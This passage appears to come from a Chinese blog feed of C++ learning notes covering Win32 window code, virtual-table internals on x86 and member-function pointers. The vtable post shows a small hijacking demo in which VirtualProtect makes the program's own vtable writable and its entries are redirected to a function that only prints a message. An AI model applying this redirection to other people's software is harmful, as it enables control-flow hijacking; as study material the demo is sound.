class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">LPCTSTR clsName = <span class="string">&quot;my&quot;</span>;</span><br><span class="line">LPCTSTR msgName = <span class="string">&quot;xuexi&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MyWinProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HWND hwnd,      <span class="comment">// handle to window</span></span></span></span><br><span class="line"><span class="params"><span class="function">UINT uMsg,      <span class="comment">// message identifier</span></span></span></span><br><span class="line"><span class="params"><span class="function">WPARAM wParam,  <span class="comment">// first message parameter</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPARAM lParam   <span class="comment">// second message parameter</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//windows主函数入口</span></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">PSTR lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">INT nCmdShow</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>&#123;</span><br><span class="line"><span class="comment">// windows对象，设计窗口类</span></span><br><span class="line">WNDCLASS wndclass;</span><br><span class="line">wndclass.cbClsExtra = <span class="literal">NULL</span>;</span><br><span class="line">wndclass.cbWndExtra = <span class="literal">NULL</span>;</span><br><span class="line">wndclass.hbrBackground = (HBRUSH)<span class="built_in">GetStockObject</span>(WHITE_BRUSH);</span><br><span class="line">wndclass.hCursor = <span class="built_in">LoadCursor</span>(<span class="literal">NULL</span>, IDC_ARROW);</span><br><span class="line">wndclass.hIcon = <span class="built_in">LoadIcon</span>(<span class="literal">NULL</span>, IDI_APPLICATION);</span><br><span class="line">wndclass.hInstance = hInstance;</span><br><span class="line"><span class="comment">//定义交互响应</span></span><br><span class="line">wndclass.lpfnWndProc = MyWinProc;  <span class="comment">//回调</span></span><br><span class="line"><span class="comment">//定义窗口代号</span></span><br><span class="line">wndclass.lpszClassName = clsName;</span><br><span class="line">wndclass.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">wndclass.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line"></span><br><span class="line"><span class="comment">//注册窗口类</span></span><br><span class="line"><span class="built_in">RegisterClass</span>(&amp;wndclass);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建窗口</span></span><br><span class="line">HWND hwnd;</span><br><span class="line">hwnd = <span class="built_in">CreateWindow</span>(</span><br><span class="line">clsName, msgName, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">hInstance, <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//显示窗口和刷新窗口</span></span><br><span class="line"><span class="built_in">ShowWindow</span>(hwnd, SW_SHOWNORMAL);</span><br><span class="line"><span class="built_in">UpdateWindow</span>(hwnd);</span><br><span class="line"></span><br><span class="line"><span class="comment">//消息循环</span></span><br><span class="line">MSG msg;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>))&#123;<span class="comment">//得到消息</span></span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);<span class="comment">//翻译消息为字符</span></span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);<span class="comment">//分派消息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> msg.wParam;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MyWinProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HWND hwnd,      <span class="comment">// handle to window</span></span></span></span><br><span class="line"><span class="params"><span class="function">UINT uMsg,      <span class="comment">// message identifier</span></span></span></span><br><span class="line"><span class="params"><span class="function">WPARAM wParam,  <span class="comment">// first message parameter</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPARAM lParam   <span class="comment">// second message parameter</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>&#123;</span><br><span class="line"><span class="comment">// uMsg 消息类型</span></span><br><span class="line"><span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">HDC hdc;</span><br><span class="line"><span class="keyword">switch</span> (uMsg)&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CHAR:</span><br><span class="line"><span class="type">char</span> szChar[<span class="number">20</span>];</span><br><span class="line"><span class="built_in">sprintf_s</span>(szChar, <span class="string">&quot;您刚才按下了：%c&quot;</span>, wParam);</span><br><span class="line"><span class="built_in">MessageBox</span>(hwnd,szChar,<span class="string">&quot;char&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line"><span class="built_in">MessageBox</span>(hwnd, <span class="string">&quot;检测鼠标左键按下&quot;</span>, <span class="string">&quot;msg&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_PAINT:</span><br><span class="line">PAINTSTRUCT ps;</span><br><span class="line">hdc = <span class="built_in">BeginPaint</span>(hwnd, &amp;ps);</span><br><span class="line"><span class="built_in">TextOut</span>(hdc, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;www.baidu.com&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;www.baidu.com&quot;</span>));</span><br><span class="line"><span class="built_in">EndPaint</span>(hwnd, &amp;ps);</span><br><span class="line"><span class="built_in">MessageBox</span>(hwnd, <span class="string">&quot;重绘&quot;</span>, <span class="string">&quot;msg&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">ret = <span class="built_in">MessageBox</span>(hwnd, <span class="string">&quot;是否真的结束?&quot;</span>, <span class="string">&quot;msg&quot;</span>, MB_YESNO);</span><br><span class="line"><span class="keyword">if</span> (ret == IDYES)&#123;</span><br><span class="line"><span class="built_in">DestroyWindow</span>(hwnd);<span class="comment">//如果选择yes则销毁窗口</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd,uMsg,wParam,lParam);</span><br><span class="line"><span class="comment">//break;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>窗口就是这玩意，不难理解也不难看出</p><img src="/2022/07/07/win-windows/005.png" class=""><blockquote><p>句柄[handle]：二级指针、资源的编号。窗口句柄、文件句柄、数据库连结句柄。</p></blockquote><p>至于c++窗口类对象和窗口之间的关系，就是对象内置窗口句柄，窗口点击关闭之后，对象不一定就释放了，但是对象的生命周期结束了，窗口就一定销毁了。</p><hr><h2 id="windows常见数据类型"><a href="#windows常见数据类型" class="headerlink" title="windows常见数据类型"></a>windows常见数据类型</h2><table><thead><tr><th>code</th><th>含义</th></tr></thead><tbody><tr><td>DWORD</td><td>32字节无符号整型数据</td></tr><tr><td>DWORD32</td><td>32字节无符号整型数据</td></tr><tr><td>DWORD64</td><td>64字节无符号整型数据</td></tr><tr><td>HANDLE</td><td>对象句柄，最基本的句柄类型</td></tr><tr><td>HICON</td><td>图标的句柄</td></tr><tr><td>HINSTANCE</td><td>程序实例的句柄</td></tr><tr><td>HKEY</td><td>注册表键的句柄</td></tr><tr><td>HMODULE</td><td>模块的句柄</td></tr><tr><td>HWND</td><td>窗口的句柄</td></tr><tr><td>INT</td><td>32位符号整型数据类型</td></tr><tr><td>INT_PTR</td><td>指向INT的指针类型</td></tr><tr><td>INT32</td><td>32位符号整型</td></tr><tr><td>INT64</td><td>64位符号整型</td></tr><tr><td>LONG32</td><td>32位符号整型</td></tr><tr><td>LONG64</td><td>64位符号整型</td></tr><tr><td>LPARAM</td><td>消息的L参数</td></tr><tr><td>WPARAM</td><td>消息的w参数</td></tr><tr><td>LPCSTR</td><td>windows，ANSI，字符串常量</td></tr><tr><td>LPCTSTR</td><td>根据环境配置，如果定义了Unicode宏，则是LPCWSTR，否则LPCSTR</td></tr><tr><td>LPCWSTR</td><td>Unicode字符串常量</td></tr><tr><td>LPDWORD</td><td>指向DWORD类型的指针</td></tr><tr><td>LPSTR</td><td>windows，ANSI，字符串变量</td></tr><tr><td>LPTSTR</td><td>根据环境配置，如果定义了Unicode宏，则是LPWSTR，否则LPSTR类型</td></tr><tr><td>LPWSTR</td><td>Unicode字符串变量</td></tr><tr><td>SIZE_T</td><td>表示内存大小，以字节位单位，其最大值是CPU最大寻址范围</td></tr><tr><td>TCHAR</td><td>如果定义了Unicode，则为WCHAR</td></tr><tr><td>WCHAR</td><td>16位Unicode字符</td></tr></tbody></table><hr><h2 id="windows命名"><a href="#windows命名" class="headerlink" title="windows命名"></a>windows命名</h2><table><thead><tr><th>前缀</th><th>含义</th><th>前缀</th><th>含义</th></tr></thead><tbody><tr><td>a</td><td>数组array</td><td>b</td><td>布尔值bool</td></tr><tr><td>by</td><td>无符号字符[字节]</td><td>c</td><td>字符[字节]</td></tr><tr><td>cb</td><td>字节计数</td><td>rgb</td><td>保存颜色值的长整型</td></tr><tr><td>cx，cy</td><td>短整型[计算x，y的长度]</td><td>dw</td><td>无符号长整型</td></tr><tr><td>fn</td><td>函数</td><td>h</td><td>句柄</td></tr><tr><td>i</td><td>整型</td><td>m_</td><td>类的数据成员member</td></tr><tr><td>n</td><td>短整型或整型</td><td>np</td><td>近指针</td></tr><tr><td>p</td><td>指针</td><td>l</td><td>长整型</td></tr><tr><td>lp</td><td>长指针</td><td>s</td><td>字符串string</td></tr><tr><td>sz</td><td>以0结尾的字符串</td><td>tm</td><td>正文大小</td></tr><tr><td>w</td><td>无符号整型</td><td>x，y</td><td>无符号整型[表示x，y的坐标]</td></tr></tbody></table><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>用空项目套窗口太累了。。。基础窗口全要自己写，而且参数是真的多。<br>先了解基本原理吧。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> windowsSocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚函数实现机制</title>
      <link href="/2022/07/06/virtualFunction1/"/>
      <url>/2022/07/06/virtualFunction1/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>虚函数本身就很玄学，像基类只做声明，派生类在定义，然后不同派生类之间还能依次找到不同的。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p><strong>注：x86环境，非x64</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AIM</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> HP;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;AIM\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Die</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;AIM-DIE\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WOLF</span> :<span class="keyword">public</span> AIM&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;WOLF\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Die</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;WOLF-DIE\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Sound</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;aowu~aowu~\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/07/06/virtualFunction1/000.png" class=""><p>当用sizeof查看aim类的大小时，发现是占用8个字节，但是按照逻辑，实际上应该是只有成员变量占用了实例化的内存。<br>而这多出来的4字节，就看要是在成员变量前面还是后面了。</p><p><code>std::cout &lt;&lt; aim &lt;&lt; &quot; &quot; &lt;&lt; &amp;aim-&gt;HP &lt;&lt; std::endl;</code></p><img src="/2022/07/06/virtualFunction1/001.png" class=""><p>发现这个四字节应该是存在于hp之前，说明大概率和后面的虚函数有关</p><p>通过反汇编之后</p><img src="/2022/07/06/virtualFunction1/002.png" class=""><p>我们看到类调用一个虚函数会这么麻烦。</p><p>他先把aim对象地址上的值传给eax，然后又把eax传给edx。<br>至于aim又传给ecx先不管，看后面的，edx+4 传给eax之后，就直接call eax了，我们知道call的都是函数的地址。<br>说明通过edx+4之后偏移得到了die虚函数的地址。<br>而根本的一切还是从aim开头。</p><img src="/2022/07/06/virtualFunction1/003.png" class=""><p>说明这个四字节很有可能就像地址表一样。</p><p>然后在调用之前的eat函数</p><img src="/2022/07/06/virtualFunction1/004.png" class=""><p>看到基本步骤都差不多，差异就在后面不是edx+4，而是直接传edx。</p><p>也就是说这个带有虚函数的类前面多出来的四字节，就是一个指针，指向虚函数表</p><img src="/2022/07/06/virtualFunction1/005.png" class=""><p>因为是指针，我们就可以取出来查看。</p><img src="/2022/07/06/virtualFunction1/006.png" class=""><p>可以看到利用指针拆分掉这个类，变成两个数组成员，0的位置就是我们类的指针区域。</p><p>因为x86的指针大小就是4字节，所以找到vtable[0]这个基地址，再将其拆出两个虚函数的地址。</p><img src="/2022/07/06/virtualFunction1/007.png" class=""><p>虽然这两个虚函数的地址可能看着很奇怪，毕竟不是放在同一个地方的。<br>可以用反汇编去印证一下。</p><img src="/2022/07/06/virtualFunction1/008.png" class=""><p>当我们逐语句执行到call eax的时候，就能观察到eax现在经过偏移得到我们调用的die虚函数的地址。</p><p>所以对于多态类而言</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AIM</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> HP;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;AIM\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Die</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;AIM-DIE\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><table><thead><tr><th>地址</th><th>变量名</th><th>含义</th></tr></thead><tbody><tr><td>+0x0</td><td>vatble</td><td>aim类虚函数地址表</td></tr><tr><td>+0x4</td><td>hp</td><td>成员变量</td></tr></tbody></table><p>他的内存分布上会有明显差异。</p><p>所以虚表的性质</p><ol><li>同一个类的多个实例都指向同一个虚函数表</li><li>通过修改虚函数表的数据可以实现劫持</li><li>只有通过指针访问函数才会调用显示函数表</li></ol><p>也就是基类的实例化对象再多，这个虚表都是一个地方，派生类肯定会和基类的虚表地址不同。<br>修改了这个虚表，就能通过这个数据偏移到其他地方</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">hack</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;被劫持辣！\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随便创个函数，然后修改func[0]为这个函数地址，就有意思了。<br>不过vs的ide好像有保护，直接写入会报错</p><img src="/2022/07/06/virtualFunction1/009.png" class=""><p>额个人是不会处理的，看大哥操作，调用windows先搞掉原有保护</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span><span class="comment">//引入头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//.....</span></span><br><span class="line">DWORD old;</span><br><span class="line"><span class="built_in">VirtualProtect</span>(func, <span class="number">8</span>, PAGE_EXECUTE_READWRITE, &amp;old);</span><br><span class="line"><span class="comment">//.....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增加这些之后，就可以修改虚地址表了。</p><img src="/2022/07/06/virtualFunction1/010.png" class=""><p>可以看到两个指向虚函数的地址都被修改成了hack函数的地址。</p><p>至于第一个说性质在这里就能看出来，因为之前的是通过wolf构建初始化的，当我们修改wolf的虚表，是不会对基类造成影响的</p><img src="/2022/07/06/virtualFunction1/011.png" class=""><p>至于第三个，像我们这种正常初始化的情况下，他没有指针，也没有通过所谓的虚表偏移去找到虚函数，而是当成一个简单的方法调用</p><img src="/2022/07/06/virtualFunction1/012.png" class=""><p>就没用收到之前修改虚表指向hack的问题。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>指针。。地址，表还是很玄乎的东西。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>类的成员函数的函数指针</title>
      <link href="/2022/07/04/classfunctionpointer/"/>
      <url>/2022/07/04/classfunctionpointer/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>函数指针：函数指针是指向函数的指针变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> (*pAdd)(<span class="type">int</span>, <span class="type">int</span>) = add;</span><br></pre></td></tr></table></figure><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;test!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hhh</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hhh!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果按照正常逻辑，想让函数指针指向一个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">void</span> (*pTest)() = test;</span><br></pre></td></tr></table></figure><p>这样肯定是不对的，因为这个test是类的成员函数而不是所谓的全局函数，如果全局函数都没有，那么这个test就是一个未定义标识符<br>有的人可能会想到作用域问题。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">void</span> (*pTest)() = Box::test;</span><br></pre></td></tr></table></figure><img src="/2022/07/04/classfunctionpointer/000.png" class=""><p>显然这也不是行的，毕竟类没有实例化，成员函数也非静态。<br>成员函数最关键的是它内部可以调用this指针，这是普通的函数无法做到的。</p><p>解决办法也是相对的，在报错的时候看到提示void (Box::*)()不能用于初始化void(*)()的实体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">void</span> (Box::*pTest)() = Box::test;</span><br></pre></td></tr></table></figure><p>那么显然它是要你在函数指针那块也要加上作用域。</p><hr><p>玩点话的，之前学过<code>typedef</code>也就是自定义类型名</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(Box:: *pBox)</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>然后就可以玩了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pBox pb;</span><br><span class="line">Box *box = <span class="keyword">new</span> <span class="built_in">Box</span>();</span><br><span class="line">(box-&gt;*pb)();</span><br></pre></td></tr></table></figure><p>不过这里会报错，因为pb没有初始化。<br>学类的时候，我们知道成员函数和成员变量有所区别，成员变量需要实例化才能调用，而成员函数编译的时候就分配好了地址，所以实例化多少类，成员函数地址都是一样的。除非说static，那种情况下既没有this指针，又在预编译阶段就完成了，可以直接通过类的作用域访问。</p><p>因此这里直接让他指向box其中的一个成员函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pBox pb = &amp;Box::test;</span><br><span class="line">Box *box = <span class="keyword">new</span> <span class="built_in">Box</span>();</span><br><span class="line">(box-&gt;*pb)();</span><br></pre></td></tr></table></figure><p>随便用一个，毕竟就俩。</p><img src="/2022/07/04/classfunctionpointer/001.png" class=""><p>可以看到，成功指向test，然后通过box指向指针解引用完成了函数调用。</p><p><strong>因为没有参数列表可能看着很古怪</strong></p><p>值得一提是，因为我们的类函数指针做了类限制，所以他只能指向这个类中的函数，普通的函数它是不能指向的。</p><hr><p>有的时候这个函数指针也可能直接作为类的成员变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>;                              <span class="comment">//声明</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(Box:: *pBox)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;test!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hhh</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hhh!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Box</span>()&#123;</span><br><span class="line">phhh = &amp;Box::hhh;</span><br><span class="line">(<span class="keyword">this</span>-&gt;*phhh)();</span><br><span class="line">&#125;</span><br><span class="line">pBox phhh;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这样一来</p><img src="/2022/07/04/classfunctionpointer/002.png" class=""><p>可以看到效果都差不多。</p><hr><p>然后就是static成员函数问题。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;func!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;test!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hhh</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hhh!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Box</span>()&#123;</span><br><span class="line">phhh = &amp;Box::hhh;</span><br><span class="line">(<span class="keyword">this</span>-&gt;*phhh)();</span><br><span class="line">&#125;</span><br><span class="line">pBox phhh;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*pFun)</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><img src="/2022/07/04/classfunctionpointer/003.png" class=""><p>正常情况下可以这样调用。</p><img src="/2022/07/04/classfunctionpointer/004.png" class=""><p>通过定义的函数指针就可以用这种方式调用。<br>因为静态成员函数没有this指针，所以不需要在通过指针指向解引用出成员函数</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>看着用吧，知道就行。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抽象类</title>
